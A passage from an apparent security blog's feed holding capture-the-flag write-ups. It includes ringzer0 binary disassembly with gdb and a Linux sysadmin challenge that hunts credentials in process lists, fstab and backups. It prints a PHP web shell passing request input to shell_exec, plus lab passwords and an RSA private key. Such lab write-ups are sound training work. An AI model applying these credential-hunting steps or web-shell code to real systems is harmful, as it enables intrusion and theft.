           0x0804854e      8b7dfc         mov edi, dword [ebp - local_4h_2]
           0x08048551      c9             leave
           0x08048552      c3             ret

</code></pre></div><p>Indeed, this is a lot of information. Let&rsquo;s dissect the programm&rsquo;s flow:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">           0x0804846c      55             push ebp
           0x0804846d      89e5           mov ebp, esp
           0x0804846f      57             push edi
           0x08048470      83e4f0         and esp, 0xfffffff0
           0x08048473      83ec30         sub esp, 0x30               ; &#39;0&#39;
</code></pre></div><p>This looks like a function <strong>prologue</strong>: Save the <strong>stack base pointer</strong>, allocate additional stack place (0x30).</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">           0x08048476      c744242c0000.  mov dword [esp + arg_2ch], 0
           0x0804847e      c70424180000.  mov dword [esp], 0x18       ; [0x18:4]=0x8048380 sym._start
           0x08048485      e8a6feffff     call sym.imp.malloc        ;  void *malloc(size_t size);
</code></pre></div><p>Allocate some heap using <code>malloc</code> &hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">           0x0804848a      8944242c       mov dword [esp + arg_2ch], eax
           0x0804848e      c74424081800.  mov dword [esp + local_8h], 0x18 ; [0x18:4]=0x8048380 sym._start
           0x08048496      c74424040000.  mov dword [esp + local_4h], 0
           0x0804849e      8b44242c       mov eax, dword [esp + arg_2ch] ; [0x2c:4]=0x280009 ; &#39;,&#39;
           0x080484a2      890424         mov dword [esp], eax
           0x080484a5      e8c6feffff     call sym.imp.memset
</code></pre></div><p>The syntax for <code>memset</code> looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">SYNOPSIS
    <span style="color:#6ab825;font-weight:bold">void</span> *<span style="color:#447fcf">memset</span>(<span style="color:#6ab825;font-weight:bold">void</span> *s, <span style="color:#6ab825;font-weight:bold">int</span> c, size_t n);

DESCRIPTION
   The memset() function fills the first n bytes of the memory area pointed to by s with the constant byte c.

RETURN VALUE
  The memset() function returns a pointer to the memory area s.
</code></pre></div><p>Since we&rsquo;re dealing with <code>x86</code> (<a href="http://wiki.osdev.org/Calling_Conventions">this site</a> is very good) the
arguments for <code>memset</code> are being pushed into the stack:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>dot {
	digraph G {
	 
		// Define layout
		graph [pad=&quot;.75&quot;, ranksep=&quot;0.95&quot;, nodesep=&quot;0.05&quot;];
		rankdir=LR;
		node [shape=&quot;record&quot;];
		rank=same;
	 
		// Define pointers
		rsp [
			label=&quot;&lt;p&gt; $rsp \l&quot;, height=&quot;0.1&quot;,
			color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white
		];
		rbp [
			label=&quot;&lt;p&gt; $rbp \l&quot;, height=&quot;0.1&quot;,
			color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white
		];
	 
		rsp_4 [
			label=&quot;&lt;p&gt; $rsp + 4 \l&quot;, height=&quot;0.01&quot;,
			color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white
		];
	 
	 
		rsp_8 [
			label=&quot;&lt;p&gt; $rsp + 8 \l&quot;, height=&quot;0.01&quot;,
			color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white,
		];
	 
		// rsp_12 [
		// 	label=&quot;&lt;p&gt; $rsp + 12 \l&quot;, height=&quot;0.01&quot;,
		// 	color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white,
		// ];
	 
		// Define stack
		stack [
			width=&quot;3&quot;,
			label=&quot;&lt;p&gt;\nStack\n\n | &lt;bp&gt;\n...\n\n | &lt;8&gt;0x8 \l | &lt;4&gt;0x0  \l | &lt;0&gt;pointer to memory allocated by malloc() \l&quot;
		];
	   
	   
		// Pointer -&gt; Stack edges
		rbp:p -&gt; stack:bp [style=dotted];
		rsp:p -&gt; stack:0 [style=dotted];
		rsp_4:p -&gt; stack:4 [style=invis];
		rsp_8:p -&gt; stack:8 [style=invis];
	}
}
</code></pre>

</details>

<p><img src="/posts/img/2016/r0-binaries/stack.dot.png" alt="stack"></p>
<p>So <code>memset</code> will set the value &ldquo;0&rdquo; 8 times at the address pointed by <code>eax</code>. Afterwards
some values will be <code>mov</code>ed into the previously allocated memory range:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">           0x080484aa      8b44242c       mov eax, dword [esp + arg_2ch] ; [0x2c:4]=0x280009 ; &#39;,&#39;
           0x080484ae      c700464c4147   mov dword [eax], 0x47414c46 ; [0x47414c46:4]=-1
           0x080484b4      c740042d3430.  mov dword [eax + 4], 0x3930342d ; [0x3930342d:4]=-1
           0x080484bb      66c740083200   mov word [eax + 8], 0x32    ; &#39;2&#39; ; [0x32:2]=27 ; &#39;2&#39;
           0x080484c1      8b44242c       mov eax, dword [esp + arg_2ch] ; [0x2c:4]=0x280009 ; &#39;,&#39;
           0x080484c5      c744241cffff.  mov dword [esp + local_1ch], 0xffffffff ; [0xffffffff:4]=-1 LEA edi ; edi
           0x080484cd      89c2           mov edx, eax
           0x080484cf      b800000000     mov eax, 0
           0x080484d4      8b4c241c       mov ecx, dword [esp + local_1ch] ; [0x1c:4]=52
           0x080484d8      89d7           mov edi, edx
           0x080484da      f2ae           repne scasb al, byte es:[edi]
           0x080484dc      89c8           mov eax, ecx
           0x080484de      f7d0           not eax
           0x080484e0      8d50ff         lea edx, [eax - 1]
           0x080484e3      8b44242c       mov eax, dword [esp + arg_2ch] ; [0x2c:4]=0x280009 ; &#39;,&#39;
           0x080484e7      01d0           add eax, edx
           0x080484e9      c70038343975   mov dword [eax], 0x75393438 ; [0x75393438:4]=-1
           0x080484ef      c74004696f32.  mov dword [eax + 4], 0x6a326f69 ; [0x6a326f69:4]=-1
           0x080484f6      66c740086600   mov word [eax + 8], 0x66    ; &#39;f&#39; ; [0x66:2]=0 ; &#39;f&#39;
           0x080484fc      c70424f88504.  mov dword [esp], str.Loading... ; [0x80485f8:4]=0x64616f4c LEA str.Loading... ; &#34;Loading...&#34; @ 0x80485f8
</code></pre></div><p>At this point I&rsquo;ll switch to <strong>dynamic analysis</strong> and therefore <strong>run</strong> the code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ gdb 88eb31060c4abd0931878bf7d2dd8c1a
...
gef&gt; b *0x080484aa
gef&gt; r
</code></pre></div><p>Now from <code>0x080484aa</code> through <code>0x080484fc</code> you can <code>s</code> (step) the opcodes. Then pay attention to the stack. You
should have sth like:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>dot {
	digraph G {
	 
		// Define layout
		graph [pad=&quot;.75&quot;, ranksep=&quot;0.95&quot;, nodesep=&quot;0.05&quot;];
		rankdir=LR;
		node [shape=&quot;record&quot;];
		rank=same;
	 
		// Define pointers
		rsp [
			label=&quot;&lt;p&gt; $rsp \l&quot;, height=&quot;0.1&quot;,
			color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white
		];
		rbp [
			label=&quot;&lt;p&gt; $rbp \l&quot;, height=&quot;0.1&quot;,
			color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white
		];
	 
		rsp_4 [
			label=&quot;&lt;p&gt; $rsp + 4 \l&quot;, height=&quot;0.01&quot;,
			color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white
		];
	 
	 
		rsp_8 [
			label=&quot;&lt;p&gt; $rsp + 8 \l&quot;, height=&quot;0.01&quot;,
			color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white,
		];
	 
		rsp_12 [
			label=&quot;&lt;p&gt; $rsp + 12 \l&quot;, height=&quot;0.01&quot;,
			color=white, fontcolor=black,fontsize=9,style=filled, fillcolor=white,
		];
	 
		// Define stack
		stack [
			width=&quot;3&quot;,
			label=&quot;&lt;p&gt;\nStack\n\n | &lt;bp&gt;\n...\n\n | &lt;12&gt;0x080485b2  \l | &lt;8&gt;0x18 \l | &lt;4&gt;0x0  \l | &lt;0&gt;0x0804b008 \l&quot;
		];
	   
		// Define values
		val [
			width=&quot;5&quot;,color=blue,
			label=&quot;&lt;p&gt;\nValues\n\n | \n...\n\n | &lt;1&gt;FLAG-4092849uio2jf \l | &lt;2&gt;(__libc_csu_init+82): add esi,0x1 \l&quot;
		];
	   
	   
		// Pointer -&gt; Stack edges
		rbp:p -&gt; stack:bp [style=dotted];
		rsp:p -&gt; stack:0 [style=dotted];
		rsp_4:p -&gt; stack:4 [style=invis];
		rsp_8:p -&gt; stack:8 [style=invis];
		rsp_12:p -&gt; stack:12 [style=invis];
	 
		// Trick to have everything horizontally aligned
		stack:p -&gt; val:p [style=invis];
	   
		// Stack -&gt; Values edges
		edge[style=dotted];
		stack:0 -&gt; val:1 [color=red];
		stack:12 -&gt; val:2;
	}
</code></pre>

</details>

<p><img src="/posts/img/2016/r0-binaries/stack-values.dot.png" alt="stack"></p>
<p>Bingo. So the flag is <code>FLAG-4092849uio2jf</code>.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>ringzer0 CTF - SysAdmin Linux</title>
      <link>https://blog.dornea.nu/2016/10/30/ringzer0-ctf-sysadmin-linux/</link>
      <pubDate>Sun, 30 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/10/30/ringzer0-ctf-sysadmin-linux/</guid>
      <content:encoded><![CDATA[<h2 id="sysadmin-part-1">SysAdmin Part 1</h2>
<p>Let&rsquo;s login to the machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13375

         _                             ____  __                     
   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
 / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
             /____/                                                 
                                      _ _             ___ _____ ___ 
                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
                            / _ \ &#39; \| | | &#39; \/ -_) | (__  | | | _| 
                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
                                                                    

You have mail.
morpheus@forensics:~$ 

</code></pre></div><p>What&rsquo;s in $HOME:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:~$ ls  -l
total 4
-rw-r----- 1 root root 1655 Mar 10  2014 egrep
morpheus@forensics:~$ ls -la
total 28
drwxr-xr-x  2 morpheus morpheus 4096 Mar 10  2014 .
drwxr-xr-x 10 root     root     4096 Jun 12  2014 ..
lrwxrwxrwx  1 root     root        9 Mar  9  2014 .bash_history -&gt; /dev/null
-rw-r-----  1 morpheus morpheus  220 Mar  9  2014 .bash_logout
-rwxrwxr-x  1 morpheus morpheus   36 Feb 24 11:16 .bashrc
-rw-r-----  1 root     root     1655 Mar 10  2014 egrep
-rw-r-----  1 morpheus morpheus  675 Mar  9  2014 .profile
-rw-r-----  1 morpheus morpheus   19 Mar  9  2014 .vimrc
</code></pre></div><p>Nothing interesting. What about running processes?</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:~$ ps -ax
 2615 ?        S      0:00 logger -t mysqld -p daemon.error
 2695 ?        Ss     0:12 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 105:108
 3110 ?        Ssl    0:00 /usr/sbin/slapd -h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d
 3159 ?        Ss     0:00 /usr/sbin/cron
 3191 ?        Ss     0:05 /usr/sbin/sshd
 3238 ?        Ss     0:12 /usr/sbin/vnstatd -d
 3262 ?        Ss     0:00 /usr/sbin/exim4 -bd -q30m
 3286 ?        S      0:04 /bin/sh /root/backup.sh -u trinity -p Flag-08grILsn3ekqhDK7cKBV6ka8B
 3289 ?        S      0:00 su neo -c /bin/monitor
 3292 ?        Ss     0:00 /bin/monitor
 3319 tty1     Ss+    0:00 /sbin/getty 38400 tty1
 3320 tty2     Ss+    0:00 /sbin/getty 38400 tty2
 3321 tty3     Ss+    0:00 /sbin/getty 38400 tty3
 3322 tty4     Ss+    0:00 /sbin/getty 38400 tty4
 3323 tty5     Ss+    0:00 /sbin/getty 38400 tty5
 3324 tty6     Ss+    0:00 /sbin/getty 38400 tty6
 3651 ?        S      0:04 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 105:108
 9100 ?        S      0:01 [kworker/0:2]
16157 ?        S      0:00 su neo -c /bin/monitor
16159 ?        Ss     0:00 /bin/monitor
19107 ?        S      0:00 [kworker/0:0]

</code></pre></div><p>Ah, there we go.</p>
<h2 id="sysadmin-part-2">SysAdmin Part 2</h2>
<p>Now let&rsquo;s login with <code>trinity</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sshpass -p Flag-08grILsn3ekqhDK7cKBV6ka8B ssh trinity@for01.ringzer0team.com -p 13375

         _                             ____  __                     
   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
 / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
             /____/                                                 
                                      _ _             ___ _____ ___ 
                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
                            / _ \ &#39; \| | | &#39; \/ -_) | (__  | | | _| 
                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
                                                                    

You have mail.

</code></pre></div><p>Now let&rsquo;s have a look inside <code>/etc</code> for files containing <strong>architect</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">trinity@forensics:/etc$ grep -r &#34;architect&#34; 2&gt;/dev/null | head -n 10
fstab:#//TheMAtrix/phone  /media/Matrix  cifs  username=architect,password=$(base64 -d &#34;RkxBRy14QXFXMnlKZzd4UERCV3VlVGdqd05jMW5WWQo=&#34;),iocharset=utf8,sec=ntlm  0  0
init.d/checkroot.sh:            # fail on older kernels on sparc64/alpha architectures due
aide/aide.conf.d/10_aide_hostname:if [ -n &#34;$(dpkg --print-architecture)&#34; ]; then
aide/aide.conf.d/10_aide_hostname:  echo &#34;@@define ARCH $(dpkg --print-architecture)&#34;
group:architect:x:1006:
passwd:architect:x:1006:1006::/home/architect:/bin/bash
^C
trinity@forensics:/etc$ echo &#34;RkxBRy14QXFXMnlKZzd4UERCV3VlVGdqd05jMW5WWQo=&#34; | base64 -d
FLAG-xAqW2yJg7xPDBWueTgjwNc1nVY

</code></pre></div><p>Ok, next level.</p>
<h2 id="sysadmin-part-3">SysAdmin Part 3</h2>
<p>Let&rsquo;s search for <strong>readable</strong> files and <strong>owned</strong> by the user <strong>architect</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ architect@forensics:/$ find . -readable -and -user architect 2&gt;/dev/null | head -n 10
./var/mail/architect
./var/www/index.php
./dev/pts/1
./dev/pts/0
./proc/11081
./proc/11081/task
./proc/11081/task/11081
./proc/11081/task/11081/attr
...
</code></pre></div><p>Hmm, <code>/var/www/index.php</code> looks interesting:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">architect@forensics:/$ cat /var/www/index.php  | head -n 20
<span style="color:#cd2828;font-weight:bold">&lt;?php</span>
<span style="color:#6ab825;font-weight:bold">if</span>(isset(<span style="color:#40ffff">$_GET</span>[<span style="color:#ed9d13">&#39;cmd&#39;</span>])) {
  <span style="color:#40ffff">$res</span> = shell_exec(urldecode(<span style="color:#40ffff">$_GET</span>[<span style="color:#ed9d13">&#39;cmd&#39;</span>]));
  print_r(str_replace(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, <span style="color:#ed9d13">&#39;&lt;br /&gt;&#39;</span>, <span style="color:#40ffff">$res</span>));
  <span style="color:#6ab825;font-weight:bold">exit</span>();
}
<span style="color:#40ffff">$info</span> = (object)<span style="color:#6ab825;font-weight:bold">array</span>();
<span style="color:#40ffff">$info</span>-&gt;<span style="color:#bbb">username</span> = <span style="color:#ed9d13">&#34;arch&#34;</span>;
<span style="color:#40ffff">$info</span>-&gt;<span style="color:#bbb">password</span> = <span style="color:#ed9d13">&#34;asdftgTst5sdf6309sdsdff9lsdftz&#34;</span>;
<span style="color:#40ffff">$id</span> = <span style="color:#3677a9">1003</span>;

<span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">GetList</span>(<span style="color:#40ffff">$id</span>, <span style="color:#40ffff">$info</span>) {
        <span style="color:#40ffff">$id</span> = <span style="color:#3677a9">2</span>;
        <span style="color:#40ffff">$link</span> = mysql_connect(<span style="color:#ed9d13">&#34;127.0.0.1&#34;</span>, <span style="color:#40ffff">$info</span>-&gt;<span style="color:#bbb">username</span>, <span style="color:#40ffff">$info</span>-&gt;<span style="color:#bbb">password</span>);
        mysql_select_db(<span style="color:#ed9d13">&#34;arch&#34;</span>, <span style="color:#40ffff">$link</span>);
        <span style="color:#40ffff">$result</span> = mysql_query(<span style="color:#ed9d13">&#34;SELECT * FROM arch&#34;</span>);
        <span style="color:#40ffff">$output</span> = <span style="color:#6ab825;font-weight:bold">array</span>();
        <span style="color:#6ab825;font-weight:bold">while</span>(<span style="color:#40ffff">$row</span> = mysql_fetch_assoc(<span style="color:#40ffff">$result</span>)) {
                array_push(<span style="color:#40ffff">$output</span>, <span style="color:#40ffff">$row</span>);
        }
...
</code></pre></div><p>Ah, some credentials for a <strong>MySQL</strong> DB. Let&rsquo;s have a look:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">architect@forensics:~$ mysql -h localhost -u arch -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 66
Server version: 5.5.49-0+deb7u1 (Debian)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| arch               |
+--------------------+
2 rows in set (0.04 sec)

mysql&gt; use arch;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;
+----------------+
| Tables_in_arch |
+----------------+
| arch           |
| flag           |
+----------------+
2 rows in set (0.00 sec)

mysql&gt; select * from flag;
+---------------------------------+
| flag                            |
+---------------------------------+
| FLAG-0I68UrLA758G5G30806w637a4k |
+---------------------------------+
1 row in set (0.00 sec)
</code></pre></div><h2 id="sysadmin-part-4">SysAdmin Part 4</h2>
<p>I first had a look about all <strong>readable</strong> files (to user <strong>architect</strong>) and searched for <code>oracle</code> inside them:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">architect@forensics:~$ find / -readable -exec grep -i &#34;oracle&#34; {} \; 2&gt;/dev/null
Binary file /backup/c074fa6ec17bb35e168366c43cf4cd19 matches
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoEgxjSM+zh29CqzIet5hxwI4gwWsHL56XlN3xM1zylCog02tZJ5/EA17hvQRoBmh+9lsEaseKnIHpf4WC6BdirAHS56bTq5Mach0cBnIdXogT1/+EsKb72dY4l9S880VsxoiLO/MxWE7oZMbLEnzOH8BJBdgEdLPI7GSaoMsHvMW17IkXuG/qzpbbROamOExC04LSZjCfrhkKxWLZ3Vzu0WLDftw661PUt9lpoBQEjB2m8voEWOqk2THPCbXTl4VMO3hZk0o5n2c6ezXwwcEcU5eTxaADELqCq0TaCvtxMFmxvC+Neu17yhO0BYK/dgdIQIf3U3MTcMpWS0LCvVuN oracle@forensics
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoEgxjSM+zh29CqzIet5hxwI4gwWsHL56XlN3xM1zylCog02tZJ5/EA17hvQRoBmh+9lsEaseKnIHpf4WC6BdirAHS56bTq5Mach0cBnIdXogT1/+EsKb72dY4l9S880VsxoiLO/MxWE7oZMbLEnzOH8BJBdgEdLPI7GSaoMsHvMW17IkXuG/qzpbbROamOExC04LSZjCfrhkKxWLZ3Vzu0WLDftw661PUt9lpoBQEjB2m8voEWOqk2THPCbXTl4VMO3hZk0o5n2c6ezXwwcEcU5eTxaADELqCq0TaCvtxMFmxvC+Neu17yhO0BYK/dgdIQIf3U3MTcMpWS0LCvVuN oracle@forensics
Binary file /var/cache/apt-show-versions/apackages matches
Binary file /var/cache/man/index.db matches
...
</code></pre></div><p>Inside <code>/backup/c074fa6ec17bb35e168366c43cf4cd19</code> we can then find:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[...]
----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqBIMY0jPs4dvQqsyHreYccCOIMFrBy+el5Td8TNc8pQqINNr
WSefxANe4b0EaAZofvZbBGrHipyB6X+FgugXYqwB0uem06uTGnIdHAZyHV6IE9f/
hLCm+9nWOJfUvPNFbMaIizvzMVhO6GTGyxJ8zh/ASQXYBHSzyOxkmqDLB7zFteyJ
F7hv6s6W20TmpjhMQtOC0mYwn64ZCsVi2d1c7tFiw37cOutT1LfZaaAUBIwdpvL6
BFjqpNkxzwm105eFTDt4WZNKOZ9nOns18MHBHFOXk8WgAxC6gqtE2gr7cTBZsbwv
jXrte8oTtAWCv3YHSECH91NzE3DKVktCwr1bjQIDAQABAoIBAQCdefu9c1WZY4bu
MrYNbf0aaE9Dhbcgzo+Me+HQxE2MxSMMCsyEhsn9wSK/5Hkidw6mF3KEmwBIcgiP
nfqdA5YV0BENahw4LITyvIVl4uw9dHuQDEzQKSzswdkkwa6FNHOSThtWSl+9ln6o
5PQXBkWGZN2oDh+vXSGvWz+QWqSho8vufmTtYntfFPAfVfcyp8BtiUgKQh069uGg
XKnehmkrHoW9gQ2Lo0uaFWcTIGm1vsgBd7L4cfb98jDB63H+Lhf4UPYv4WmH2rrj
bnk5lAU71JK4QsPnnOx1PA685p2e5mEfh0LKRKq9Fx3+umbGPJGvgcjobtXaW9OT
mpaz6ZPBAoGBAM+diN8s/osQdi8odS9+HUWVZBa9Z2Dn0X2IlSxWK9u/UclhjYgP
i2KXEY0wRV+ZiXURmrFNVxgA/EJ9BOgptSZNmi9fEdfnVB4L11T7HFny/J8u3sXt
dn0OqHmf5ZEPtV7m0bK0jtznTgTTuBI9yXvRgHO2HQPCshdP7GIgt++lAoGBAM89
Pd7HyMYnh0ancCTICkVIIWF6Ylf20BKz4Zwy9tYASCxY3iFllBdOXw/UgCnmJseQ
73Dcimi5OEyUckOp7xX4HTwidFVbxfNeC0ZfsPbd22qSDcw5orpQMoDy3iP+bPJh
SgwtusqotGjm0jTpnhqRV5x6rchzkMYwF8/WkvfJAoGBAMeem6yh0XiaclfzWYE5
jCGMezjWEeD949IEkhGYJQFbmeK79l49O/KmeAy9veYmdSDntUoGp9f/kozHMgGb
oH5cnQQxL7HczWc6UWd3LhJabIUNhsreAFBL2Ldgg1UPun6uBjACJV7G06AWhWSc
ne58SDp5frpP5/Y8NXdAKDq1AoGAYCSFQ4lj96n29CxRtn6nZSTld5eTcEOsnECf
dhuesAFJemlwBAZgAb/2Eh3/p3CCpSr0KmPmQldLaxujNwjrRkHpLjC9z6vX1ePX
TzqtmpmqZXKEvC4w9EaoZ3JE5GXwnTHNbID6m3JQ4CnVc36+Po0XHB096jTTAV7m
bSGa5SECgYBE2IuW1pk2pOZ+FDtKltWHk8KK89QmGsFf2YnVZ/FsAkPnayeTkmMz
AWxRP/W/Uj5ypw7KjprQee31hkisBG/ZPBvQdjAvxF7m4usuEN2Nkb0FTIjZHYbD
iPOmPHIUlwwL8UVzDQUzXhegSB4GUeP/06T/eM5PPB8SX0ZaHIw1wQ==
-----END RSA PRIVATE KEY-----
[...]
</code></pre></div><p>&hellip; which is most probably a private ssh key. Next I try to login to the machine using the previously find SSH identity:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">% ssh -i ssh oracle@for01.ringzer0team.com -p 13375

         _                             ____  __                     
   _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
  / ___/ / __ \/ __ `/_  / / _ \/ ___/ / / / __/ _ \/ __ `/ __ `__ \
 / /  / / / / / /_/ / / /_/  __/ /  / /_/ / /_/  __/ /_/ / / / / / /
/_/  /_/_/ /_/\__, / /___/\___/_/   \____/\__/\___/\__,_/_/ /_/ /_/ 
             /____/                                                 
                                      _ _             ___ _____ ___ 
                             ___ _ _ | (_)_ _  ___   / __|_   _| __|
                            / _ \ &#39; \| | | &#39; \/ -_) | (__  | | | _| 
                            \___/_||_|_|_|_||_\___|  \___| |_| |_|  
                                                                    

You have mail.
</code></pre></div><p>Bingo! Now let&rsquo;s look around:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">oracle@forensics:~$ ls -la
total 36
drwxr-x---  3 oracle oracle 4096 Mar 12  2014 .
drwxr-xr-x 10 root   root   4096 Jun 12  2014 ..
-rw-------  1 root   root      0 Mar 12  2014 .bash_history
-rw-r-----  1 oracle oracle  220 Dec 29  2012 .bash_logout
-rw-r-----  1 oracle oracle 3512 Mar 12  2014 .bashrc
-rw-r-----  1 oracle oracle   90 Mar 12  2014 encflag.txt.enc
-rw-r-----  1 oracle oracle   45 Mar 12  2014 flag.txt
-rw-r-----  1 oracle oracle  675 Dec 29  2012 .profile
drwx------  2 oracle oracle 4096 Mar 12  2014 .ssh
-rw-r-----  1 oracle oracle   19 Mar  4  2014 .vimrc
oracle@forensics:~$ cat flag.txt 
RkxBRy1HSUdzMVdxNlY2U3NaOWg0YVFncEdnZGJkUAo=
oracle@forensics:~$ cat flag.txt | base64 -d
FLAG-GIGs1Wq6V6SsZ9h4aQgpGgdbdP
</code></pre></div><h2 id="sysadmin-part-5">SysAdmin Part 5</h2>
<p>SSH into machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a61717;background-color:#e3d2d2">$</span> ssh -i ssh oracle<span style="color:#a61717;background-color:#e3d2d2">@</span>for01.ringzer0team.com -p <span style="color:#3677a9">13375</span>
oracle<span style="color:#a61717;background-color:#e3d2d2">@</span>forensics:<span style="color:#a61717;background-color:#e3d2d2">~$</span> cat .bashrc 
<span style="color:#a61717;background-color:#e3d2d2">#</span> <span style="color:#a61717;background-color:#e3d2d2">~</span>/.bashrc: executed by <span style="color:#447fcf">bash</span>(<span style="color:#3677a9">1</span>) <span style="color:#6ab825;font-weight:bold">for</span> non-login shells.
<span style="color:#a61717;background-color:#e3d2d2">#</span> see /usr/share/doc/bash/examples/startup-<span style="color:#447fcf">files</span> (in the <span style="color:#6ab825;font-weight:bold">package</span> bash-doc)
<span style="color:#a61717;background-color:#e3d2d2">#</span> <span style="color:#6ab825;font-weight:bold">for</span> examples

<span style="color:#a61717;background-color:#e3d2d2">#</span> If not running interactively, don<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>t do anything
<span style="color:#6ab825;font-weight:bold">case</span> <span style="color:#a61717;background-color:#e3d2d2">$</span>- in
    *i*) ;;
      *) <span style="color:#6ab825;font-weight:bold">return</span>;;
esac

<span style="color:#a61717;background-color:#e3d2d2">#</span> don<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>t put duplicate lines or lines starting with space in the history.
